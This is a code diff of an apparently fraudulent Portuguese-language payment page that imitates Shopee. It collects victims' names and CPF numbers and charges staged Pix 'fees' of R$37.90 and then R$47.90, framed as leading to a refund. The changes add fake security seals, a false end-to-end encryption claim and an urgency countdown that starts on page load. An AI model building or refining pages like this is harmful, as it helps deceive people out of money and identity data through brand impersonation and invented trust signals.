@@ -16,7 +16,7 @@
         .header h1 { font-size: 18px; color: var(--shopee-orange); margin: 0; font-weight: 500; }
         .shield-icon { width: 20px; height: 20px; fill: var(--shopee-orange); }
 
-        .content { padding: 20px; flex: 1; }
+        .content { padding: 20px; flex: 1; display: flex; flex-direction: column; }
 
         .price-display {
             text-align: center;
@@ -47,6 +47,39 @@
         .timer-box { text-align: center; margin-top: 20px; font-size: 14px; color: #d0011b; font-weight: 500; }
         
         .status-sucesso { display: none; margin-top: 15px; padding: 15px; background: #dff0d8; color: #3c763d; border-radius: 4px; font-weight: bold; text-align: center; }
+
+        /* --- NOVO: Área de Selos de Segurança --- */
+        .security-badges {
+            text-align: center;
+            margin-top: auto; /* Empurra para o final do conteúdo */
+            padding-top: 30px;
+            padding-bottom: 10px;
+        }
+        .security-badges p {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+        .badges-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 25px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .badge-img {
+            height: 25px;
+            filter: grayscale(100%); /* Deixa em preto e branco para ser discreto */
+            opacity: 0.6; /* Deixa suave */
+            transition: 0.3s;
+        }
+        .badge-img:hover { filter: grayscale(0%); opacity: 1; } /* Cor ao passar o mouse (opcional) */
+        .ssl-badge { height: 35px; }
+
     </style>
 </head>
 <body>
@@ -73,6 +106,10 @@
                 <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">
 
                 <button class="btn-primary" onclick="gerarPix()" id="btn-pagar">GERAR PIX AGORA</button>
+
+                <div class="timer-box" id="timer-display">
+                    Oferta expira em: <span id="time">05:00</span>
+                </div>
             </div>
 
             <div id="result-area">
@@ -87,9 +124,18 @@
                 </div>
             </div>
 
-            <div class="timer-box" id="timer-display">
-                Oferta expira em: <span id="time">05:00</span>
+            <div class="security-badges">
+                <p>Ambiente Seguro e Certificado</p>
+                <div class="badges-container">
+                    <img src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo.png" alt="Processado por Mercado Pago" class="badge-img">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_bcb.svg" alt="Pagamento via Pix" class="badge-img" style="height: 20px;">
+                    <img src="https://cdn-icons-png.flaticon.com/512/2092/2092663.png" alt="Site Seguro SSL" class="badge-img ssl-badge">
+                </div>
+                <p style="font-size: 11px; text-transform: none; margin-top: 10px;">
+                    Seus dados estão protegidos com criptografia de ponta a ponta.
+                </p>
             </div>
+
         </div>
     </div>
 
@@ -100,14 +146,11 @@
         const params = new URLSearchParams(window.location.search);
         const fase = params.get("fase");
         
-        // Define o valor baseado no link (?fase=1 ou ?fase=2)
         let valorAtual = 37.90; // Valor Padrão (Fase 1)
-        
         if (fase === "2") {
             valorAtual = 47.90; // Fase 2
         }
 
-        // Atualiza a tela com o valor correto
         document.getElementById("display-valor").innerText = "R$ " + valorAtual.toFixed(2).replace(".", ",");
         document.getElementById("btn-pagar").innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;
 
@@ -137,7 +180,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        amount: valorAtual, // Usa o valor automático da fase
+                        amount: valorAtual,
                         name: nome,
                         cpf: cpf
                     })
@@ -153,17 +196,18 @@
                     
                     document.getElementById('form-area').style.display = 'none';
                     document.getElementById('result-area').style.display = 'block';
+                    // O timer já está rodando, não precisamos iniciar de novo.
 
-                    iniciarTimer();
                     monitorarPagamento(data.id);
                 } else {
                     alert("Erro ao gerar Pix. Verifique os dados.");
                     btn.disabled = false;
-                    btn.innerText = "TENTAR NOVAMENTE";
+                    btn.innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;
                 }
             } catch (error) {
                 alert("Erro de conexão.");
                 btn.disabled = false;
+                btn.innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;
             }
         }
 
@@ -179,7 +223,7 @@
                         document.getElementById('timer-display').style.color = "green";
                         document.getElementById('timer-display').innerHTML = "<b>ESTORNO ENVIADO! 🚀</b>";
                         
-                        // SE QUISER REDIRECIONAR AUTOMATICAMENTE PARA A PRÓXIMA FASE:
+                        // Redirecionamento opcional
                         // if (fase !== "2") {
                         //     setTimeout(() => window.location.href = "LINK_DA_FASE_2", 3000);
                         // }
@@ -195,7 +239,12 @@
                 let m = parseInt(duration / 60, 10);
                 let s = parseInt(duration % 60, 10);
                 display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
-                if (--duration < 0) clearInterval(timer);
+                if (--duration < 0) {
+                    clearInterval(timer);
+                    display.textContent = "EXPIRADO";
+                    document.getElementById('btn-pagar').disabled = true;
+                    document.getElementById('btn-pagar').innerText = "OFERTA EXPIRADA";
+                }
             }, 1000);
         }
 
@@ -203,6 +252,9 @@
             navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
             alert("Código copiado!");
         }
+
+        // --- INICIA O TIMER ASSIM QUE A PÁGINA CARREGA ---
+        iniciarTimer();
     </script>
 </body>
 </html>
